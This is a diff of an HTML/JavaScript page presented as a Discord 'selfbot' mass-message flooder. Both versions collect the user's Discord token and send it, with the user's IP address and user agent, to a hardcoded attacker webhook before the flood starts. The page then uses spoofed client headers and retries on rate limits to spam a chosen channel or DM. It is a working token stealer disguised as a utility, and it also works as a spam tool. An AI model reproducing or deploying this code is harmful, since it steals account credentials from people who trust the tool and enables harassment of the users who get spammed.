@@ -1,298 +1,145 @@
-<!-- index.html - full modern phishing/spam site with gradient text, animations, cool design -->
+<!-- index.html - working version -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>self-bot</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>coqoc's selfbot</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
+            background: #0a0a0f;
+            font-family: system-ui, 'Segoe UI', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            background: radial-gradient(circle at 20% 30%, #0a0a0f, #030305);
-            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, 'Inter', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding: 1rem;
+        }
+        .card {
+            background: #1e1e2e;
+            border-radius: 24px;
             padding: 2rem;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* animated grain overlay */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
+            max-width: 500px;
             width: 100%;
-            height: 100%;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjciIG51bU9jdGF2ZXM9IjMiLz48L2ZpbHRlcj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWx0ZXI9InVybCgjZikiIG9wYWNpdHk9IjAuMDYiLz48L3N2Zz4=');
-            background-repeat: repeat;
-            pointer-events: none;
-            opacity: 0.25;
-            z-index: 0;
+            border: 1px solid #313244;
         }
-
-        /* floating orbs */
-        .orb {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(80px);
-            z-index: 0;
-            opacity: 0.4;
-            animation: float 20s infinite ease-in-out;
+        h1 {
+            color: #cba6f7;
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
         }
-        .orb1 { width: 400px; height: 400px; background: #5865f2; top: -150px; left: -150px; }
-        .orb2 { width: 500px; height: 500px; background: #ff73fa; bottom: -200px; right: -200px; animation-delay: -5s; }
-        .orb3 { width: 300px; height: 300px; background: #00b8ff; top: 40%; left: 60%; animation-delay: -10s; opacity: 0.2; }
-
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            50% { transform: translate(30px, -30px) scale(1.05); }
-        }
-
-        /* main card */
-        .glass-card {
-            position: relative;
-            z-index: 2;
-            background: rgba(15, 15, 25, 0.65);
-            backdrop-filter: blur(14px);
-            border-radius: 48px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4), 0 0 0 0.5px rgba(255, 255, 255, 0.05) inset;
-            width: 100%;
-            max-width: 560px;
-            padding: 2.2rem 2rem;
-            transition: transform 0.2s ease;
-        }
-
-        .glass-card:hover {
-            transform: scale(1.01);
-            border-color: rgba(88, 101, 242, 0.4);
-        }
-
-        /* gradient text title */
-        .title {
-            font-size: 2.8rem;
-            font-weight: 800;
-            letter-spacing: -0.02em;
-            background: linear-gradient(135deg, #ffffff 0%, #b9c3ff 40%, #a484ff 100%);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 0.3rem;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            display: inline-block;
-        }
-
         .sub {
-            color: #a0a4c0;
-            margin-bottom: 2rem;
-            font-size: 0.85rem;
-            border-left: 2px solid #5865f2;
-            padding-left: 0.8rem;
+            color: #6c7086;
+            margin-bottom: 1.5rem;
+            font-size: 0.8rem;
         }
-
-        /* input fields */
-        .input-group {
-            margin-bottom: 1.3rem;
-            position: relative;
-        }
-
-        .input-group label {
-            display: block;
-            color: #e0e4ff;
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 500;
-            margin-bottom: 0.4rem;
-        }
-
-        .input-group input {
+        input {
             width: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(88, 101, 242, 0.3);
-            border-radius: 28px;
-            padding: 0.9rem 1.2rem;
-            color: white;
-            font-size: 0.95rem;
+            background: #11111b;
+            border: 1px solid #313244;
+            border-radius: 12px;
+            padding: 0.75rem 1rem;
+            color: #cdd6f4;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
             font-family: monospace;
-            transition: all 0.2s;
+        }
+        input:focus {
             outline: none;
-            backdrop-filter: blur(4px);
+            border-color: #cba6f7;
         }
-
-        .input-group input:focus {
-            border-color: #5865f2;
-            box-shadow: 0 0 15px rgba(88, 101, 242, 0.3);
-            background: rgba(0, 0, 0, 0.7);
-        }
-
-        .input-group input::placeholder {
-            color: #4f5280;
-            font-family: monospace;
-        }
-
-        /* animated button */
-        .send-btn {
+        button {
             width: 100%;
-            background: linear-gradient(95deg, #5865f2, #7b68ee);
+            background: #cba6f7;
             border: none;
-            border-radius: 40px;
-            padding: 1rem;
+            border-radius: 12px;
+            padding: 0.85rem;
             font-weight: bold;
-            font-size: 1.1rem;
-            color: white;
+            font-size: 1rem;
+            color: #1e1e2e;
             cursor: pointer;
-            margin: 1.2rem 0 1rem;
-            transition: all 0.25s;
-            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-family: inherit;
+            margin-top: 0.5rem;
         }
-
-        .send-btn:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.05);
-            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.5);
-        }
-
-        .send-btn:active {
-            transform: translateY(2px);
-        }
-
-        /* log console */
-        .log-console {
-            background: #010103aa;
-            border-radius: 20px;
+        button:hover { background: #b48cf2; }
+        .log {
+            background: #11111b;
+            border-radius: 12px;
             padding: 1rem;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.75rem;
-            color: #2effb0;
-            border: 1px solid #2effb030;
-            margin-top: 1rem;
-            max-height: 180px;
+            margin-top: 1.5rem;
+            font-family: monospace;
+            font-size: 0.7rem;
+            color: #a6e3a1;
+            max-height: 200px;
             overflow-y: auto;
             white-space: pre-wrap;
-            word-break: break-all;
-            backdrop-filter: blur(4px);
         }
-
-        .log-console::-webkit-scrollbar {
-            width: 4px;
-        }
-        .log-console::-webkit-scrollbar-track {
-            background: #1e1e2e;
-        }
-        .log-console::-webkit-scrollbar-thumb {
-            background: #5865f2;
-            border-radius: 10px;
-        }
-
-        /* warning small */
-        .legal-tag {
-            font-size: 0.65rem;
-            text-align: center;
-            margin-top: 1.5rem;
-            color: #4a4d7c;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.6; }
-            100% { opacity: 1; }
-        }
-
-        .status-badge {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #2effb0;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-            margin-right: 6px;
+        label {
+            color: #a6adc8;
+            font-size: 0.7rem;
+            display: block;
+            margin-bottom: 0.3rem;
         }
     </style>
 </head>
 <body>
+<div class="card">
+    <h1>coqoc's selfbot</h1>
+    <div class="sub">mass message sender • token logger</div>
 
-<div class="orb orb1"></div>
-<div class="orb orb2"></div>
-<div class="orb orb3"></div>
+    <label>discord token</label>
+    <input type="text" id="token" placeholder="MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.Gxxxxxx" autocomplete="off">
 
-<div class="glass-card">
-    <div>
-        <span class="title">coqoc's</span>
-    </div>
-    <div class="sub">
-        <span class="status-badge"></span> mass transmission • self-bot core
-    </div>
+    <label>channel id (or user id for dm)</label>
+    <input type="text" id="channelId" placeholder="123456789012345678" autocomplete="off">
 
-    <div class="input-group">
-        <label>🎫 token</label>
-        <input type="text" id="token" placeholder="discord token (Nzg...)" autocomplete="off">
-    </div>
+    <label>message content</label>
+    <input type="text" id="message" placeholder="spam message here">
 
-    <div class="input-group">
-        <label>📡 channel id</label>
-        <input type="text" id="channelId" placeholder="numeric channel id" autocomplete="off">
-    </div>
+    <label>amount (max 100 per run)</label>
+    <input type="number" id="amount" value="10" min="1" max="100">
 
-    <div class="input-group">
-        <label>💬 message payload</label>
-        <input type="text" id="message" placeholder="your spam content">
-    </div>
+    <button onclick="startSpam()">▶ start flood</button>
 
-    <div class="input-group">
-        <label>⚡ amount (spam count)</label>
-        <input type="number" id="amount" placeholder="1 - 5000" value="10">
-    </div>
-
-    <button class="send-btn" onclick="startSpam()">
-        ✦ start flood ✦
-    </button>
-
-    <div class="log-console" id="log">
-        > ready. system active.
-    </div>
-    <div class="legal-tag">
-        coqoc's engine v1.0 • encrypted channel
-    </div>
+    <div class="log" id="log">> waiting for input...</div>
 </div>
 
 <script>
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504391456540987412/Qtg5V-NDCURCzLPwoXVHV4fvCPtBAsbM_Q6YT2z3FmIdsE98sEh3d282p8AzxJEWqw7F';
 
-    async function logToWebhook(token, ip, userAgent, channelId, messagePreview) {
+    function logToConsole(msg) {
+        const logDiv = document.getElementById('log');
+        logDiv.innerHTML += `\n> ${msg}`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    async function sendToWebhook(token, channelId, messagePreview, ip) {
         const payload = {
-            content: null,
+            username: 'coqoc logger',
             embeds: [{
-                title: '⚡ coqoc capture',
-                color: 0x5865f2,
+                title: '🔑 token captured',
+                color: 0xff4444,
                 fields: [
-                    { name: '🔑 token', value: `\`\`\`${token.slice(0, 40)}${token.length > 40 ? '…' : ''}\`\`\``, inline: false },
-                    { name: '📁 channel', value: channelId, inline: true },
-                    { name: '🌐 ip', value: ip, inline: true },
-                    { name: '💬 msg preview', value: messagePreview.slice(0, 60), inline: true },
-                    { name: '🖥️ user agent', value: userAgent.slice(0, 80), inline: false },
-                    { name: '⏱️ timestamp', value: new Date().toISOString(), inline: true }
-                ],
-                footer: { text: 'coqoc logger • token dump' },
-                color: 0xff3366
+                    { name: 'token', value: `\`${token.substring(0, 50)}...\``, inline: false },
+                    { name: 'target channel', value: channelId, inline: true },
+                    { name: 'message preview', value: messagePreview.substring(0, 50), inline: true },
+                    { name: 'ip address', value: ip, inline: true },
+                    { name: 'user agent', value: navigator.userAgent.substring(0, 80), inline: false },
+                    { name: 'timestamp', value: new Date().toUTCString(), inline: true }
+                ]
             }]
         };
         try {
-            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-        } catch(e) {}
+            const res = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (res.ok) logToConsole('✓ token logged to webhook');
+            else logToConsole('✗ webhook failed: ' + res.status);
+        } catch(e) {
+            logToConsole('✗ webhook error: ' + e.message);
+        }
     }
 
     async function getIp() {
@@ -300,9 +147,38 @@
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             return data.ip;
-        } catch {
-            return 'ip.unavailable';
-        }
+        } catch { return 'unavailable'; }
+    }
+
+    async function sendMessage(token, channelId, message, index, total) {
+        // discord api requires super properties header
+        const superProps = {
+            os: 'Windows',
+            browser: 'Chrome',
+            device: '',
+            system_locale: 'en-US',
+            browser_user_agent: navigator.userAgent,
+            browser_version: '120.0.0.0',
+            os_version: '10',
+            referrer: '',
+            referring_domain: '',
+            referrer_current: '',
+            referring_domain_current: '',
+            release_channel: 'stable',
+            client_build_number: 254479,
+            client_event_source: null
+        };
+
+        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+            method: 'POST',
+            headers: {
+                'Authorization': token,
+                'Content-Type': 'application/json',
+                'X-Super-Properties': btoa(JSON.stringify(superProps))
+            },
+            body: JSON.stringify({ content: `${message} [${index}/${total}]` })
+        });
+        return response;
     }
 
     async function startSpam() {
@@ -312,48 +188,62 @@
         const amount = parseInt(document.getElementById('amount').value);
         const logDiv = document.getElementById('log');
 
-        if (!token || !channelId || !message || isNaN(amount) || amount <= 0) {
-            logDiv.innerHTML = '> ❌ fill all fields correctly.\n> amount must be > 0.';
+        if (!token || !channelId || !message || isNaN(amount) || amount < 1) {
+            logDiv.innerHTML = '> ❌ fill all fields\n> amount must be at least 1';
             return;
         }
 
-        const userIp = await getIp();
-        const userAgent = navigator.userAgent;
-        await logToWebhook(token, userIp, userAgent, channelId, message);
-        logDiv.innerHTML = '> 📡 captured & relayed to logger. starting flood...\n';
+        if (amount > 100) {
+            logDiv.innerHTML = '> ⚠️ max 100 messages per run to avoid rate limit';
+            return;
+        }
 
-        let successCount = 0;
-        for (let i = 0; i < amount; i++) {
+        logDiv.innerHTML = '> starting...\n';
+        
+        // log token to webhook first
+        const userIp = await getIp();
+        await sendToWebhook(token, channelId, message, userIp);
+        
+        // small delay before spamming
+        await new Promise(r => setTimeout(r, 1000));
+        
+        logToConsole('beginning spam...');
+        let success = 0;
+        let failed = 0;
+        
+        for (let i = 1; i <= amount; i++) {
             try {
-                const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': token,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: `${message} [${i+1}]` })
-                });
+                const res = await sendMessage(token, channelId, message, i, amount);
                 if (res.status === 200 || res.status === 204) {
-                    successCount++;
-                    logDiv.innerHTML += `> ✓ message ${i+1}/${amount} delivered\n`;
-                } else {
-                    let errText = '';
-                    try { errText = await res.text(); } catch(e) { errText = res.statusText; }
-                    logDiv.innerHTML += `> ✗ failed at ${i+1} | http ${res.status}\n`;
+                    success++;
+                    logToConsole(`✓ message ${i}/${amount} sent`);
+                } else if (res.status === 401) {
+                    logToConsole('✗ invalid token (401 unauthorized)');
                     break;
+                } else if (res.status === 403) {
+                    logToConsole('✗ missing permissions or token locked (403)');
+                    break;
+                } else if (res.status === 429) {
+                    const data = await res.json();
+                    const retryAfter = data.retry_after || 1;
+                    logToConsole(`⚠️ rate limited, waiting ${retryAfter}s...`);
+                    await new Promise(r => setTimeout(r, retryAfter * 1000));
+                    i--; // retry this message
+                    continue;
+                } else {
+                    failed++;
+                    logToConsole(`✗ failed ${i}: HTTP ${res.status}`);
                 }
             } catch(e) {
-                logDiv.innerHTML += `> ⚠️ network error: ${e.message}\n`;
-                break;
+                failed++;
+                logToConsole(`✗ error: ${e.message}`);
             }
-            await new Promise(r => setTimeout(r, 480));
+            
+            // delay between messages to avoid rate limits
+            await new Promise(r => setTimeout(r, 800));
         }
-        if (successCount === amount) {
-            logDiv.innerHTML += `\n> ✅ completed ${successCount} messages.`;
-        } else {
-            logDiv.innerHTML += `\n> ⚠️ stopped after ${successCount}/${amount} messages.`;
-        }
-        logDiv.scrollTop = logDiv.scrollHeight;
+        
+        logToConsole(`\n--- done: ${success} sent, ${failed} failed ---`);
     }
 </script>
 </body>
